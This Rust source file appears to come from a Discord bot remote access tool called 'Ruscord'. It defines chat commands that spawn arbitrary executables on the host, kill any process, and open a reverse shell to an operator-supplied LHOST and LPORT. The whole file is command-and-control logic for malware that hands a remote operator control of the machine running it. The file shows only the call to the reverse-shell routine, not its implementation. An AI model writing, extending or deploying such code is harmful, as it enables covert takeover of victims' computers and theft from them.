use std::net::IpAddr;

use crate::{os::traits::process::ProcessModule, reply, RuscordContext, RuscordError};
/// Spawns an executable on the host with optional arguments.
#[poise::command(prefix_command, slash_command)]
pub async fn spawn(
	ctx: RuscordContext<'_>,
	#[description = "Executable to spawn (file name if in PATH, otherwise fully qualified path"] name: String,
	#[description = "Optional arguments to pass to the executable"] args: Option<String>,
) -> Result<(), RuscordError> {
	let os_module = &ctx.data().os_module;
	os_module.spawn(&name, args)?;
	reply!(ctx, "Process successfully spawned!");
	Ok(())
}

/// Kills a process on the host with an optional exit code.
#[poise::command(prefix_command, slash_command)]
pub async fn kill(
	ctx: RuscordContext<'_>, #[description = "Process to kill. If `-1`, will kill the current process"] pid: i32,
	#[description = "Optional exit code to pass to the process"] exit_code: Option<u32>,
) -> Result<(), RuscordError> {
	let os_module = &ctx.data().os_module;
	match pid {
		-1 => os_module.kill_self(exit_code),
		_ => {
			os_module.kill_other(pid as u32, exit_code)?;
			reply!(ctx, "Process successfully killed!");
		},
	};
	Ok(())
}

/// Opens a reverse shell to the target host.
#[poise::command(prefix_command, slash_command)]
pub async fn shell(
	ctx: RuscordContext<'_>, #[description = "LHOST"] ip: IpAddr, #[description = "LPORT"] port: u16,
) -> Result<(), RuscordError> {
	let os_module = &ctx.data().os_module;

	os_module.reverse_shell(ip, port).await?;
	reply!(ctx, "Shell successfully opened!");
	Ok(())
}
